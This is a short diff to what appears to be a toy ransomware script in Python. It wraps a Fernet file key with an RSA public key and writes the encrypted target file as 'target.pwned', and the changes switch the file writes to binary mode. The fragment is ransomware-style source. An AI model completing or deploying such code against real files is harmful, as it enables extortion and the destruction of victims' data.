@@ -16,8 +16,9 @@ def keys():
     asymPubKey = rsa.PublicKey.load_pkcs1(keydata)
 
     symKeyEncrypted = rsa.encrypt(symKey, asymPubKey)
-    symKeyFile = open("symKeyEnc.txt", "x")
-    symKeyFile.write(str(symKeyEncrypted))
+    print(symKeyEncrypted)
+    symKeyFile = open("symKeyEnc.txt", "wb")
+    symKeyFile.write(symKeyEncrypted)
     symKeyFile.close()
 
     #Prints keys for debugging purposes
@@ -45,8 +46,8 @@ def encrypt(symKey, unencryptedFile):
 
     #Encrypt and save the loaded file
     encryptedFile = fernet.encrypt(unencryptedFile.encode())
-    ef = open("target.pwned", "x")
-    ef.write(str(encryptedFile))
+    ef = open("target.pwned", "wb")
+    ef.write(encryptedFile)
     ef.close()
 
     #Prints the unencryped and encrypted files for debugging purposes
